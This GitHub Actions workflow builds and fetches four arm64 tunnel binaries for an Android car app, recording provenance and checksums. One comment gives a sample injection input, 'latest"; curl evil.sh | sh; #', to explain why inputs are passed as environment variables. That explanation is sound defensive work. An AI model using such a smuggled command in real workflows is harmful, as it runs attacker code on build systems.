name: Tunnel binaries

# Builds the four tunnel executables the app ships (tailscale, cloudflared, zrok,
# sing-box) from upstream source, for arm64, and publishes them with checksums.
#
# WHY THIS EXISTS
# ---------------
# These four were previously committed to the repository as ~40 MB of opaque prebuilt
# blobs under app/src/main/jniLibs/arm64-v8a/. An audit of them established:
#
#   * all four are UPX-packed, and three had the UPX PackHeader stripped, so `upx -d`
#     refuses them and they cannot be unpacked for inspection;
#   * the one that could be unpacked (tailscale) reports `mod tailscale.com (devel)` —
#     a build from a working tree, matching no official release artifact;
#   * cloudflared self-reports `DEV (built unknown)` and zrok `v1.1.x [developer build]`,
#     i.e. neither carries any version information that can be checked against anything.
#
# Nothing malicious was found, but "we cannot verify this" is not a property a repo
# should have for four binaries that open network tunnels on a car. Building them here,
# from pinned upstream refs, replaces trust-the-blob with a reproducible recipe.
#
# The packing is kept — it is load-bearing for APK size (tailscale is 4.3 MB packed vs
# 17.9 MB unpacked) — but the PackHeader is left INTACT, so anyone can `upx -d` the
# result and read it. That is the property the vendored copies lacked.

on:
  # Reusable: the release pipeline calls this with compression=max rather than
  # duplicating the whole build.
  workflow_call:
    inputs:
      # Blank => use the version pinned in app/tunnel-binaries.lock (single source of truth).
      tailscale_ref:   { type: string, default: "" }
      cloudflared_ref: { type: string, default: "" }
      zrok_ref:        { type: string, default: "" }
      singbox_ref:     { type: string, default: "" }
      compression:
        description: "fast (default UPX) or max (--best --lzma)"
        type: string
        default: "fast"
  workflow_dispatch:
    inputs:
      # Every ref defaults to blank => the version pinned in app/tunnel-binaries.lock is used.
      # Set one only to test a different upstream ref without touching the lock.
      tailscale_ref:
        description: "tailscale git tag (blank = lock)"
        default: ""
      cloudflared_ref:
        description: "cloudflared git tag (blank = lock)"
        default: ""
      zrok_ref:
        # NOT 'latest'. zrok v2 renamed the command to cmd/zrok2 and is a breaking major;
        # ZrokLauncher is written against the v1.x CLI. Staying on v1 is a compatibility
        # requirement — which is why the pinned version lives in the lock, not 'latest'.
        description: "zrok git tag (blank = lock; stay on v1.x — v2 breaks ZrokLauncher)"
        default: ""
      singbox_ref:
        description: "sing-box git tag (blank = lock)"
        default: ""
      compression:
        description: "fast (default UPX) or max (--best --lzma, much slower)"
        type: choice
        options: ["fast", "max"]
        default: "fast"
  push:
    paths:
      - ".github/workflows/tunnel-binaries.yml"

permissions:
  contents: read

concurrency:
  group: tunnel-binaries-${{ github.ref }}
  cancel-in-progress: true

jobs:
  build:
    name: Build tunnel binaries (arm64)
    runs-on: ubuntu-latest
    timeout-minutes: 90

    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false

      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          go-version: "stable"
          check-latest: true

      - name: Install UPX
        run: sudo apt-get update -qq && sudo apt-get install -y -qq upx-ucl

      - name: Set up Android SDK
        uses: android-actions/setup-android@40fd30fb8d7440372e1316f5d1809ec01dcd3699 # v4.0.1

      - name: Install NDK (for llvm-strip)
        # The SHIPPED artifacts are stripped, and they must be stripped with the SAME tool
        # AGP uses during packaging — otherwise AGP re-strips them, the bytes change, and
        # the digest pinned in app/build.gradle.kts stops describing what actually ships.
        # Same NDK version as app/build.gradle.kts's ndkVersion.
        run: sdkmanager --install "ndk;26.1.10909125"

      - name: Build binaries
        env:
          # CGO off + GOOS=linux gives a fully static arm64 executable. The app execs these
          # as processes (it copies them out of nativeLibraryDir and runs them via shell) —
          # it never dlopen()s them — so they do not need to be Android/bionic-linked. The
          # vendored copies were GOOS=android and therefore depended on /system/bin/linker64,
          # which is also why they could not be run anywhere but the device for analysis.
          CGO_ENABLED: "0"
          GOOS: linux
          GOARCH: arm64
          # Reproducibility: -trimpath removes local filesystem paths; -buildvcs=false keeps
          # this repo's VCS state out of binaries built from someone else's module.
          GOFLAGS: "-trimpath -buildvcs=false"
          # `gh api` resolves "latest" to a concrete release tag. Read-only.
          GH_TOKEN: ${{ github.token }}
          # workflow_dispatch inputs reach the script as environment variables, never
          # interpolated into the shell source. A `${{ ... }}` expansion inside a run block
          # is textual substitution before bash ever sees it, so an input like
          #   latest"; curl evil.sh | sh; #
          # would execute. As env vars they are inert data. (zizmor: template-injection)
          TS_REF_IN: ${{ inputs.tailscale_ref }}
          CF_REF_IN: ${{ inputs.cloudflared_ref }}
          ZR_REF_IN: ${{ inputs.zrok_ref }}
          SB_REF_IN: ${{ inputs.singbox_ref }}
        run: |
          set -euo pipefail
          mkdir -p out

          # Single source of truth: versions come from app/tunnel-binaries.lock. A non-blank
          # workflow_dispatch input overrides one ref for testing; a `push`-triggered run has
          # no inputs, so the lock supplies all four.
          lock_ver() { awk -F= -v k="^$1\\.upstream" '$0 ~ k {split($2,a," "); print a[3]}' app/tunnel-binaries.lock; }
          TS_REF="${TS_REF_IN:-$(lock_ver libtailscale)}"
          CF_REF="${CF_REF_IN:-$(lock_ver libcloudflared)}"
          ZR_REF="${ZR_REF_IN:-$(lock_ver libzrok)}"
          SB_REF="${SB_REF_IN:-$(lock_ver libsingbox)}"
          for kv in "tailscale=$TS_REF" "cloudflared=$CF_REF" "zrok=$ZR_REF" "sing-box=$SB_REF"; do
            [ -n "${kv#*=}" ] || { echo "::error::no version for ${kv%%=*} in app/tunnel-binaries.lock"; exit 1; }
          done
          echo "Refs (from lock unless overridden): tailscale=$TS_REF cloudflared=$CF_REF zrok=$ZR_REF sing-box=$SB_REF"

          # Reject anything that is not a plausible module version. These are pasted into
          # `go install mod@REF`, and this is the last line of defence if the env-var
          # discipline above is ever undone.
          for r in "$TS_REF" "$CF_REF" "$ZR_REF" "$SB_REF"; do
            case "$r" in
              latest|v[0-9]*|[0-9]*.[0-9]*|[0-9a-f]*) ;;
              *) echo "::error::refusing suspicious version ref: $r"; exit 1 ;;
            esac
          done

          # tailscale: the tag set is not decoration. It is what keeps the binary at ~4 MB
          # instead of ~30 MB, and it was recovered from the shipped binary's own build info
          # so this reproduces the size profile the app was designed around. ts_include_cli
          # folds the `tailscale` CLI into the daemon, which is why one file serves as both.
          TS_TAGS="ts_include_cli,ts_omit_ace,ts_omit_acme,ts_omit_advertiseexitnode,ts_omit_advertiseroutes,ts_omit_appconnectors,ts_omit_aws,ts_omit_bakedroots,ts_omit_bird,ts_omit_c2n,ts_omit_cachenetmap,ts_omit_captiveportal,ts_omit_capture,ts_omit_cliconndiag,ts_omit_clientupdate,ts_omit_cloud,ts_omit_colorable,ts_omit_completion,ts_omit_completion_scripts,ts_omit_conn25,ts_omit_dbus,ts_omit_debug,ts_omit_debugeventbus,ts_omit_debugportmapper,ts_omit_desktop_sessions,ts_omit_dns,ts_omit_doctor,ts_omit_drive,ts_omit_gro,ts_omit_health,ts_omit_hujsonconf,ts_omit_identityfederation,ts_omit_iptables,ts_omit_kube,ts_omit_lazywg,ts_omit_linkspeed,ts_omit_linuxdnsfight,ts_omit_listenrawdisco,ts_omit_logtail,ts_omit_netlog,ts_omit_networkmanager,ts_omit_oauthkey,ts_omit_peerapiclient,ts_omit_peerapiserver,ts_omit_portlist,ts_omit_portmapper,ts_omit_posture,ts_omit_qrcodes,ts_omit_relayserver,ts_omit_resolved,ts_omit_sdnotify,ts_omit_ssh,ts_omit_synology,ts_omit_syspolicy,ts_omit_systray,ts_omit_taildrop,ts_omit_tailnetlock,ts_omit_tap,ts_omit_tpm,ts_omit_unixsocketidentity,ts_omit_useexitnode,ts_omit_useproxy,ts_omit_usermetrics,ts_omit_useroutes,ts_omit_wakeonlan,ts_omit_webbrowser,ts_omit_webclient"

          # STRATEGY: prefer the official upstream release artifact; build from source
          # only where no published artifact can serve.
          #
          #   cloudflared / zrok / sing-box -> download upstream's own arm64 release.
          #     Those are the artifacts upstream builds, tests and publishes checksums for.
          #     Rebuilding them ourselves would produce something *less* verifiable, not
          #     more — and it is what the vendored blobs did (all three self-reported as
          #     developer builds with no checkable version).
          #
          #   tailscale -> build from source, because no official artifact exists for the
          #     configuration this app needs: the ~60 ts_omit_* tags below are what keep it
          #     at ~4 MB instead of ~30 MB, and an official tailscaled is the full build.
          #
          # Failures that shaped this, all from this workflow's own CI:
          #   * `go install pkg@version` refuses modules with `replace` directives in
          #     go.mod (cloudflared has them).
          #   * zrok cannot be `go build`-ed without first running its npm UI build —
          #     `//go:embed dist` fails with "pattern dist: no matching files found".
          mkdir -p src
          : > out/PROVENANCE.txt

          note() { echo "$*" >> out/PROVENANCE.txt; }

          # --- tailscale: from source ---------------------------------------------------
          echo "::group::tailscaled (tailscale/tailscale @ $TS_REF, from source)"
          git clone --quiet --depth 1 --branch "$TS_REF" https://github.com/tailscale/tailscale.git src/tailscale
          note "tailscaled  source  tailscale/tailscale  $TS_REF  $(git -C src/tailscale rev-parse HEAD)"
          ( cd src/tailscale && go build -trimpath -ldflags="-s -w" -tags="$TS_TAGS" -o ../../out/tailscaled ./cmd/tailscaled )
          echo "::endgroup::"

          # --- the rest: official upstream release artifacts -----------------------------
          echo "::group::cloudflared (cloudflare/cloudflared @ $CF_REF, official artifact)"
          gh release download "$CF_REF" --repo cloudflare/cloudflared \
            --pattern "cloudflared-linux-arm64" --output out/cloudflared --clobber
          chmod +x out/cloudflared
          note "cloudflared release  cloudflare/cloudflared  $CF_REF  cloudflared-linux-arm64  sha256=$(sha256sum out/cloudflared | cut -d" " -f1)"
          echo "::endgroup::"

          echo "::group::zrok (openziti/zrok @ $ZR_REF, official artifact)"
          ZR_NUM="${ZR_REF#v}"
          gh release download "$ZR_REF" --repo openziti/zrok \
            --pattern "zrok_${ZR_NUM}_linux_arm64.tar.gz" --output src/zrok.tgz --clobber
          note "zrok        release  openziti/zrok  $ZR_REF  zrok_${ZR_NUM}_linux_arm64.tar.gz  sha256=$(sha256sum src/zrok.tgz | cut -d" " -f1)"
          tar -xzf src/zrok.tgz -C src zrok
          mv src/zrok out/zrok
          echo "::endgroup::"

          echo "::group::sing-box (sagernet/sing-box @ $SB_REF, official ANDROID artifact)"
          SB_NUM="${SB_REF#v}"
          # sing-box publishes a real android-arm64 build — use it rather than the linux one.
          gh release download "$SB_REF" --repo sagernet/sing-box \
            --pattern "sing-box-${SB_NUM}-android-arm64.tar.gz" --output src/singbox.tgz --clobber
          note "sing-box    release  sagernet/sing-box  $SB_REF  sing-box-${SB_NUM}-android-arm64.tar.gz  sha256=$(sha256sum src/singbox.tgz | cut -d" " -f1)"
          tar -xzf src/singbox.tgz -C src --strip-components=1 "sing-box-${SB_NUM}-android-arm64/sing-box"
          mv src/sing-box out/sing-box
          chmod +x out/sing-box

          echo "::endgroup::"

          echo "### provenance"; cat out/PROVENANCE.txt
          ls -la out/

      - name: Record build info
        # PROVENANCE.txt (written above) already records, per binary, whether it came from
        # source or an upstream release, the exact tag, and the commit or artifact digest.
        # This adds each binary's embedded Go build info on top — the module table that,
        # for the vendored blobs, could only be recovered by unpacking one of them and
        # dumping the other three out of live process memory on the car.
        run: |
          set -euo pipefail
          : > out/VERSIONS.txt
          for b in out/tailscaled out/cloudflared out/zrok out/sing-box; do
            echo "### $b" >> out/VERSIONS.txt
            go version -m "$b" 2>/dev/null | grep -E "^[[:space:]]+(path|mod|build[[:space:]]+-tags)" >> out/VERSIONS.txt || \
              echo "  (no embedded build info)" >> out/VERSIONS.txt
          done
          echo "### provenance"; cat out/PROVENANCE.txt
          echo "### versions";   cat out/VERSIONS.txt

      - name: Pack and name for jniLibs
        # Android extracts lib/<abi>/*.so from the APK to nativeLibraryDir with the execute
        # bit set, which is why CLI executables are shipped under .so names. That part of
        # the original design is sound and is preserved.
        env:
          COMPRESSION: ${{ inputs.compression }}
        run: |
          set -euo pipefail
          mkdir -p dist

          # Two modes, because the trade-off is real. On ~100 MB of input, --best ran for
          # >15 min in CI for a few percent — a bad deal on every workflow edit, a good one
          # for something that ships to a car with finite storage.
          #   fast (default, and what push/PR runs) : plain upx
          #   max  (what the release pipeline uses) : --best --lzma
          case "${COMPRESSION:-fast}" in
            max)  UPX_ARGS=(-q --best --lzma) ;;
            fast) UPX_ARGS=(-q) ;;
            *)    echo "::error::unknown compression: $COMPRESSION"; exit 1 ;;
          esac
          echo "compression mode: ${COMPRESSION:-fast}  (upx ${UPX_ARGS[*]})"

          pack() {
            local src="$1" dst="$2"
            cp "out/$src" "dist/$dst"
            # NO --no-mark: the PackHeader must survive so `upx -d` works. That is the
            # whole point — the vendored blobs had it stripped and were unanalysable.
            if ! upx "${UPX_ARGS[@]}" "dist/$dst" >/dev/null; then
              # --lzma is not supported for every ELF variant; fall back rather than fail.
              echo "::warning::upx ${UPX_ARGS[*]} failed on $dst — retrying with --best"
              cp "out/$src" "dist/$dst"
              upx -q --best "dist/$dst" >/dev/null
            fi
            upx -t "dist/$dst"     # refuses if the packed image is not decompressible
          }
          pack tailscaled  libtailscale.so
          pack cloudflared libcloudflared.so
          pack zrok        libzrok.so
          pack sing-box    libsingbox.so

          # Two variants per binary:
          #   libX.so        - stripped. This is what the APK ships.
          #   libX.intact.so - packed but NOT stripped. Keeps the UPX PackHeader, so anyone
          #                    can `upx -d` it and read the payload. This is the audit copy,
          #                    and the reason the shipped file is verifiable at all: strip it
          #                    with the NDK llvm-strip and you must get the shipped digest.
          STRIP="$ANDROID_HOME/ndk/26.1.10909125/toolchains/llvm/prebuilt/linux-x86_64/bin/llvm-strip"
          echo "strip: $STRIP"
          for f in dist/*.so; do
            cp "$f" "${f%.so}.intact.so"
            "$STRIP" --strip-all "$f"
            # Fixed point check: AGP will strip again during packaging, and that must be a
            # no-op. If stripping twice is not identical, the pinned digest cannot hold.
            cp "$f" /tmp/twice.so && "$STRIP" --strip-all /tmp/twice.so
            cmp -s "$f" /tmp/twice.so || { echo "::error::strip is not idempotent for $f"; exit 1; }
            rm -f /tmp/twice.so
          done

          echo "### packed sizes (mode: ${COMPRESSION:-fast})"
          for f in dist/*.so; do
            printf "  %-22s %10d bytes (from %d)\n" "$(basename "$f")" \
              "$(stat -c%s "$f")" "$(stat -c%s "out/$(basename "$f" | sed -e s/^lib// -e s/\.so$// -e s/^tailscale$/tailscaled/ -e s/^singbox$/sing-box/)")"
          done
          echo "  TOTAL packed: $(cat dist/*.so | wc -c) bytes"

      - name: Verify arm64, and that the audit copies still unpack
        run: |
          set -euo pipefail
          for f in dist/*.so; do
            file "$f" | grep -q "ARM aarch64" || { echo "::error::$f is not arm64"; exit 1; }
          done
          # Only the .intact.so copies can round-trip: the shipped ones are deliberately
          # stripped, which removes the PackHeader `upx -d` needs. That is precisely why
          # the intact copy is published alongside — it is the auditable one.
          for f in dist/*.intact.so; do
            upx -d -o /tmp/unpacked "$f" >/dev/null
            rm -f /tmp/unpacked
            echo "  ✓ $(basename "$f") unpacks cleanly (PackHeader intact)"
          done

      - name: Checksums and the full provenance chain
        run: |
          set -euo pipefail
          cd dist && sha256sum *.so | tee SHA256SUMS
          cd ..
          {
            echo
            echo "## chain"
            echo "# shipped = llvm-strip --strip-all (NDK 26.1.10909125) applied to intact"
            echo "# verify:  download libX.intact.so, strip it with that exact tool,"
            echo "#          and the result must hash to the shipped digest below."
            for n in tailscale cloudflared zrok singbox; do
              printf "lib%s.so  shipped=%s  intact=%s\n" "$n" \
                "$(sha256sum "dist/lib$n.so"        | cut -d" " -f1)" \
                "$(sha256sum "dist/lib$n.intact.so" | cut -d" " -f1)"
            done
          } >> out/PROVENANCE.txt
          cat out/PROVENANCE.txt

      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: tunnel-binaries-arm64
          path: |
            dist/*.so
            dist/*.intact.so
            dist/SHA256SUMS
            out/VERSIONS.txt
            out/PROVENANCE.txt
          if-no-files-found: error
